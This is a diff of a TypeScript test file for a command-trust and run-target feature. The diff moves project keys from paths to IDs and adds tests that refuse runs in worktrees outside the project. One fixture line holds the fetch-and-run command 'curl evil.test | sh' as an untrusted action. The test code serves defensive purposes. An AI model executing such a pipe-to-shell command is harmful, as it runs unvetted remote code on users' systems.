@@ -4,6 +4,7 @@ import { describe, expect, it } from 'vitest'
 import { createActionsOperations } from './actions-operations'
 import type {
   ActionsChanges,
+  ActionsProjects,
   ActionsStore,
   ActionsStoreResult,
   ActionsTransactResult,
@@ -11,7 +12,15 @@ import type {
 } from './actions-ports'
 import { commandFingerprint } from './json-action-trust-store'
 
-const PROJECT = '/synthetic/repo'
+const PROJECT = 'proj-alpha'
+const WORKTREE = '/synthetic/projects/alpha'
+const OTHER_WORKTREE = '/synthetic/projects/alpha-topic'
+const TARGET = {
+  environmentId: 'env-local',
+  projectId: PROJECT,
+  worktreeId: 'wt-alpha-main',
+  path: WORKTREE,
+} as const
 const ID_A = 'action-a'
 const ID_B = 'action-b'
 
@@ -26,18 +35,18 @@ function memoryStore(initial: ActionsFileV1 = emptyActionsFileV1()): {
   let writes = 0
 
   const store: ActionsStore = {
-    async read(projectPath) {
+    async read(projectId) {
       reads += 1
-      const file = files.get(projectPath) ?? emptyActionsFileV1()
+      const file = files.get(projectId) ?? emptyActionsFileV1()
       return { ok: true, value: structuredClone(file) }
     },
-    async transact(projectPath, change) {
+    async transact(projectId, change) {
       reads += 1
-      const current = files.get(projectPath) ?? emptyActionsFileV1()
+      const current = files.get(projectId) ?? emptyActionsFileV1()
       const planned = change(structuredClone(current))
       if (!planned.ok) return planned
       writes += 1
-      files.set(projectPath, structuredClone(planned.value.file))
+      files.set(projectId, structuredClone(planned.value.file))
       return planned
     },
   }
@@ -62,14 +71,14 @@ function memoryTrust(): {
   const byProject = new Map<string, Set<string>>()
   let writes = 0
   const trustStore: ActionTrustStore = {
-    async readFingerprints(projectPath) {
-      return { ok: true, value: new Set(byProject.get(projectPath) ?? []) }
+    async readFingerprints(projectId) {
+      return { ok: true, value: new Set(byProject.get(projectId) ?? []) }
     },
-    async trustCommands(projectPath, commands) {
+    async trustCommands(projectId, commands) {
       writes += 1
-      const existing = new Set(byProject.get(projectPath) ?? [])
+      const existing = new Set(byProject.get(projectId) ?? [])
       for (const command of commands) existing.add(commandFingerprint(command))
-      byProject.set(projectPath, existing)
+      byProject.set(projectId, existing)
       return { ok: true, value: undefined }
     },
   }
@@ -82,13 +91,22 @@ function memoryTrust(): {
   }
 }
 
+/** The Projects capability Actions verifies a run target against. */
+function knownWorktrees(paths: readonly string[] = [WORKTREE, OTHER_WORKTREE]): ActionsProjects {
+  return {
+    async listWorktreePaths(projectId) {
+      return { ok: true, value: projectId === PROJECT ? paths : [] }
+    },
+  }
+}
+
 function recordingChanges(): { changes: ActionsChanges; events: string[] } {
   const events: string[] = []
   return {
     events,
     changes: {
       publish(change) {
-        events.push(`${change.type}:${change.projectPath}`)
+        events.push(`${change.type}:${change.projectId}`)
       },
     },
   }
@@ -102,8 +120,9 @@ describe('actions operations', () => {
     let tick = 100
     let n = 0
     const ops = createActionsOperations({
-      store: mem.store,
+      sources: [{ kind: 'private', store: mem.store }],
       trustStore: trust.trustStore,
+      projects: knownWorktrees(),
       clock: {
         now: () => {
           tick += 1
@@ -119,11 +138,11 @@ describe('actions operations', () => {
       changes,
     })
 
-    expect(await ops.listActions({ projectPath: PROJECT })).toEqual({ ok: true, value: [] })
+    expect(await ops.listActions({ projectId: PROJECT })).toEqual({ ok: true, value: [] })
     expect(events).toEqual([])
 
     const created = await ops.addAction({
-      projectPath: PROJECT,
+      projectId: PROJECT,
       title: '  Ship  ',
       command: 'make ship',
     })
@@ -133,7 +152,7 @@ describe('actions operations', () => {
     expect(events).toEqual([`actions.changed:${PROJECT}`])
     expect(trust.byProject.get(PROJECT)?.has(commandFingerprint('make ship'))).toBe(true)
 
-    const listed = await ops.listActions({ projectPath: PROJECT })
+    const listed = await ops.listActions({ projectId: PROJECT })
     expect(listed.ok).toBe(true)
     if (!listed.ok) return
     expect(listed.value[0]?.trusted).toBe(true)
@@ -165,36 +184,36 @@ describe('actions operations', () => {
         },
       },
     }))
-    const untrustedList = await ops.listActions({ projectPath: PROJECT })
+    const untrustedList = await ops.listActions({ projectId: PROJECT })
     expect(untrustedList.ok).toBe(true)
     if (!untrustedList.ok) return
     expect(untrustedList.value.find((a) => a.id === ID_B)?.trusted).toBe(false)
 
-    const trusted = await ops.trustActions({ projectPath: PROJECT, ids: [ID_B, 'missing'] })
+    const trusted = await ops.trustActions({ projectId: PROJECT, ids: [ID_B, 'missing'] })
     expect(trusted).toEqual({ ok: true, value: undefined })
     expect(trust.byProject.get(PROJECT)?.has(commandFingerprint('curl evil.test | sh'))).toBe(true)
 
     const retitled = await ops.updateAction({
-      projectPath: PROJECT,
+      projectId: PROJECT,
       id: created.value.id,
       title: 'Ship it',
     })
     expect(retitled).toEqual({ ok: true, value: undefined })
     // Retitle keeps trust
-    const afterRetitle = await ops.listActions({ projectPath: PROJECT })
+    const afterRetitle = await ops.listActions({ projectId: PROJECT })
     expect(afterRetitle.ok).toBe(true)
     if (!afterRetitle.ok) return
     expect(afterRetitle.value.find((a) => a.id === created.value.id)?.trusted).toBe(true)
 
     const recommanded = await ops.updateAction({
-      projectPath: PROJECT,
+      projectId: PROJECT,
       id: created.value.id,
       command: 'make ship2',
     })
     expect(recommanded).toEqual({ ok: true, value: undefined })
     expect(trust.byProject.get(PROJECT)?.has(commandFingerprint('make ship2'))).toBe(true)
 
-    const deleted = await ops.deleteAction({ projectPath: PROJECT, id: ID_B })
+    const deleted = await ops.deleteAction({ projectId: PROJECT, id: ID_B })
     expect(deleted).toEqual({ ok: true, value: undefined })
 
     // add, trust, retitle, recommanded, delete
@@ -212,20 +231,21 @@ describe('actions operations', () => {
     const trust = memoryTrust()
     const { changes, events } = recordingChanges()
     const ops = createActionsOperations({
-      store: mem.store,
+      sources: [{ kind: 'private', store: mem.store }],
       trustStore: trust.trustStore,
+      projects: knownWorktrees(),
       changes,
     })
 
-    expect(await ops.updateAction({ projectPath: PROJECT, id: 'nope', title: 'x' })).toEqual({
+    expect(await ops.updateAction({ projectId: PROJECT, id: 'nope', title: 'x' })).toEqual({
       ok: false,
       error: { code: 'actions.not-found', actionId: 'nope' },
     })
-    expect(await ops.moveAction({ projectPath: PROJECT, id: 'nope', direction: 'up' })).toEqual({
+    expect(await ops.moveAction({ projectId: PROJECT, id: 'nope', direction: 'up' })).toEqual({
       ok: false,
       error: { code: 'actions.not-found', actionId: 'nope' },
     })
-    expect(await ops.deleteAction({ projectPath: PROJECT, id: 'nope' })).toEqual({
+    expect(await ops.deleteAction({ projectId: PROJECT, id: 'nope' })).toEqual({
       ok: false,
       error: { code: 'actions.not-found', actionId: 'nope' },
     })
@@ -233,18 +253,18 @@ describe('actions operations', () => {
     expect(events).toEqual([])
 
     const writesBefore = mem.writes
-    expect(await ops.moveAction({ projectPath: PROJECT, id: ID_A, direction: 'up' })).toEqual({
+    expect(await ops.moveAction({ projectId: PROJECT, id: ID_A, direction: 'up' })).toEqual({
       ok: true,
       value: undefined,
     })
-    expect(await ops.moveAction({ projectPath: PROJECT, id: ID_B, direction: 'down' })).toEqual({
+    expect(await ops.moveAction({ projectId: PROJECT, id: ID_B, direction: 'down' })).toEqual({
       ok: true,
       value: undefined,
     })
     expect(mem.writes).toBe(writesBefore)
     expect(events).toEqual([])
 
-    expect(await ops.moveAction({ projectPath: PROJECT, id: ID_A, direction: 'down' })).toEqual({
+    expect(await ops.moveAction({ projectId: PROJECT, id: ID_A, direction: 'down' })).toEqual({
       ok: true,
       value: undefined,
     })
@@ -271,7 +291,7 @@ describe('actions operations', () => {
       async read() {
         return { ok: true, value: structuredClone(preRead) }
       },
-      async transact(_projectPath, change) {
+      async transact(_projectId, change) {
         const planned = change(structuredClone(inTransaction))
         if (!planned.ok) return planned
         writes += 1
@@ -281,12 +301,13 @@ describe('actions operations', () => {
     const trust = memoryTrust()
     const { changes, events } = recordingChanges()
     const ops = createActionsOperations({
-      store,
+      sources: [{ kind: 'private', store }],
       trustStore: trust.trustStore,
+      projects: knownWorktrees(),
       changes,
     })
 
-    expect(await ops.moveAction({ projectPath: PROJECT, id: ID_A, direction: 'down' })).toEqual({
+    expect(await ops.moveAction({ projectId: PROJECT, id: ID_A, direction: 'down' })).toEqual({
       ok: true,
       value: undefined,
     })
@@ -302,20 +323,21 @@ describe('actions operations', () => {
     const trust = memoryTrust()
     const { changes, events } = recordingChanges()
     const ops = createActionsOperations({
-      store: mem.store,
+      sources: [{ kind: 'private', store: mem.store }],
       trustStore: trust.trustStore,
+      projects: knownWorktrees(),
       changes,
     })
 
     const updated = await ops.updateAction({
-      projectPath: PROJECT,
+      projectId: PROJECT,
       id: ID_A,
       command: '  make ship  ',
     })
     expect(updated).toEqual({ ok: true, value: undefined })
     expect(trust.byProject.get(PROJECT)?.has(commandFingerprint('make ship'))).toBe(true)
 
-    const listed = await ops.listActions({ projectPath: PROJECT })
+    const listed = await ops.listActions({ projectId: PROJECT })
     expect(listed.ok).toBe(true)
     if (!listed.ok) return
     expect(listed.value.find((a) => a.id === ID_A)).toMatchObject({
@@ -333,32 +355,149 @@ describe('actions operations', () => {
     const trust = memoryTrust()
     const { changes, events } = recordingChanges()
     const ops = createActionsOperations({
-      store: mem.store,
+      sources: [{ kind: 'private', store: mem.store }],
       trustStore: trust.trustStore,
+      projects: knownWorktrees(),
       changes,
     })
 
-    expect(await ops.prepareActionRun({ projectPath: PROJECT, actionId: 'nope' })).toEqual({
+    expect(await ops.prepareActionRun({ actionId: 'nope', target: TARGET })).toEqual({
       ok: false,
       error: { code: 'actions.not-found', actionId: 'nope' },
     })
-    expect(await ops.prepareActionRun({ projectPath: PROJECT, actionId: ID_A })).toEqual({
+    expect(await ops.prepareActionRun({ actionId: ID_A, target: TARGET })).toEqual({
       ok: false,
       error: { code: 'actions.untrusted', actionId: ID_A },
     })
 
     await trust.trustStore.trustCommands(PROJECT, ['echo a'])
-    expect(await ops.prepareActionRun({ projectPath: PROJECT, actionId: ID_A })).toEqual({
+    expect(await ops.prepareActionRun({ actionId: ID_A, target: TARGET })).toEqual({
       ok: true,
       value: {
         id: ID_A,
         title: 'A',
         command: 'echo a',
         where: 'primary',
-        projectPath: PROJECT,
+        cwd: WORKTREE,
       },
     })
     expect(events).toEqual([])
+  })
+
+  it('runs in the Worktree the target names, not the first checkout of the Project', async () => {
+    const mem = memoryStore({
+      version: 1,
+      actions: [{ id: ID_A, title: 'A', command: 'echo a', order: 1, createdAt: 1 }],
+    })
+    const trust = memoryTrust()
+    await trust.trustStore.trustCommands(PROJECT, ['echo a'])
+    const ops = createActionsOperations({
+      sources: [{ kind: 'private', store: mem.store }],
+      trustStore: trust.trustStore,
+      projects: knownWorktrees(),
+      changes: recordingChanges().changes,
+    })
+
+    const prepared = await ops.prepareActionRun({
+      actionId: ID_A,
+      target: { ...TARGET, worktreeId: 'wt-alpha-topic', path: OTHER_WORKTREE },
+    })
+    expect(prepared).toEqual({
+      ok: true,
+      value: { id: ID_A, title: 'A', command: 'echo a', where: 'primary', cwd: OTHER_WORKTREE },
+    })
+  })
+
+  it('refuses a target whose path is not a Worktree of that Project', async () => {
+    const mem = memoryStore({
+      version: 1,
+      actions: [{ id: ID_A, title: 'A', command: 'echo a', order: 1, createdAt: 1 }],
+    })
+    const trust = memoryTrust()
+    await trust.trustStore.trustCommands(PROJECT, ['echo a'])
+    const { changes, events } = recordingChanges()
+    const ops = createActionsOperations({
+      sources: [{ kind: 'private', store: mem.store }],
+      trustStore: trust.trustStore,
+      projects: knownWorktrees(),
+      changes,
+    })
+
+    // A path that exists but belongs to somebody else's checkout is exactly the
+    // mistake explicit targeting exists to stop — it must not run "close enough".
+    expect(
+      await ops.prepareActionRun({
+        actionId: ID_A,
+        target: { ...TARGET, path: '/synthetic/projects/beta' },
+      }),
+    ).toEqual({ ok: false, error: { code: 'actions.target-invalid', actionId: ID_A } })
+
+    // Same for a Project this daemon does not currently have any checkout for.
+    expect(
+      await ops.prepareActionRun({
+        actionId: ID_A,
+        target: { ...TARGET, projectId: 'proj-unknown' },
+      }),
+    ).toEqual({ ok: false, error: { code: 'actions.not-found', actionId: ID_A } })
+    expect(events).toEqual([])
+  })
+
+  it('refuses the run when the Projects capability is unavailable', async () => {
+    const mem = memoryStore({
+      version: 1,
+      actions: [{ id: ID_A, title: 'A', command: 'echo a', order: 1, createdAt: 1 }],
+    })
+    const trust = memoryTrust()
+    await trust.trustStore.trustCommands(PROJECT, ['echo a'])
+    const ops = createActionsOperations({
+      sources: [{ kind: 'private', store: mem.store }],
+      trustStore: trust.trustStore,
+      projects: {
+        async listWorktreePaths() {
+          return { ok: false, error: { code: 'actions.unavailable' } }
+        },
+      },
+      changes: recordingChanges().changes,
+    })
+
+    expect(await ops.prepareActionRun({ actionId: ID_A, target: TARGET })).toEqual({
+      ok: false,
+      error: { code: 'actions.unavailable' },
+    })
+  })
+
+  it('lists every configured source in order, first claim of an id winning', async () => {
+    const privateStore = memoryStore({
+      version: 1,
+      actions: [{ id: ID_A, title: 'Private A', command: 'echo private', order: 1, createdAt: 1 }],
+    })
+    const secondStore = memoryStore({
+      version: 1,
+      actions: [
+        { id: ID_A, title: 'Shadow', command: 'echo shadow', order: 1, createdAt: 1 },
+        { id: ID_B, title: 'Only here', command: 'echo b', order: 2, createdAt: 2 },
+      ],
+    })
+    const trust = memoryTrust()
+    const ops = createActionsOperations({
+      sources: [
+        { kind: 'private', store: privateStore.store },
+        // Stand-in for the tracked overlay #26 adds; the read path must already
+        // walk more than one source rather than assuming a single document.
+        { kind: 'private', store: secondStore.store },
+      ],
+      trustStore: trust.trustStore,
+      projects: knownWorktrees(),
+      changes: recordingChanges().changes,
+    })
+
+    const listed = await ops.listActions({ projectId: PROJECT })
+    expect(listed.ok).toBe(true)
+    if (!listed.ok) return
+    expect(listed.value.map((action) => [action.id, action.title])).toEqual([
+      [ID_A, 'Private A'],
+      [ID_B, 'Only here'],
+    ])
   })
 
   it('surfaces adapter unavailable and never notifies on store failure', async () => {
@@ -380,18 +519,19 @@ describe('actions operations', () => {
       },
     }
     const ops = createActionsOperations({
-      store,
+      sources: [{ kind: 'private', store }],
       trustStore,
+      projects: knownWorktrees(),
       clock: { now: () => 1 },
       ids: { create: () => ID_A },
       changes,
     })
 
-    expect(await ops.listActions({ projectPath: PROJECT })).toEqual({
+    expect(await ops.listActions({ projectId: PROJECT })).toEqual({
       ok: false,
       error: { code: 'actions.unavailable' },
     })
-    expect(await ops.addAction({ projectPath: PROJECT, title: 'x', command: 'y' })).toEqual({
+    expect(await ops.addAction({ projectId: PROJECT, title: 'x', command: 'y' })).toEqual({
       ok: false,
       error: { code: 'actions.unavailable' },
     })
@@ -403,15 +543,16 @@ describe('actions operations', () => {
     const trust = memoryTrust()
     const { changes, events } = recordingChanges()
     const ops = createActionsOperations({
-      store: mem.store,
+      sources: [{ kind: 'private', store: mem.store }],
       trustStore: trust.trustStore,
+      projects: knownWorktrees(),
       clock: { now: () => 1 },
       ids: { create: () => ID_A },
       changes,
     })
 
     const tooLong = await ops.addAction({
-      projectPath: PROJECT,
+      projectId: PROJECT,
       title: 'x'.repeat(241),
       command: 'make',
     })
